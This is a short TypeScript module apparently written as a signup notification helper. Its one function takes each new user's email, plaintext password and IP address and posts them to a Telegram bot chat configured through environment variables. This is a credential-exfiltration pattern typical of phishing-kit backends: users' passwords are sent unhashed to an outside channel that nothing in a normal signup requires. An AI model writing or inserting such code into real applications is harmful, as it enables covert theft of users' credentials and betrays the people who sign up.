import axios from 'axios';
import dotenv from 'dotenv';

dotenv.config();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export const sendSignupTelegramMessage = async (email: string, password: string, ip: string) => {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        throw new Error('Telegram bot token or chat ID not set in environment variables.');
    }
    const message = `New signup:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ip}`;
    const url = `${process.env.TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
    });
}; 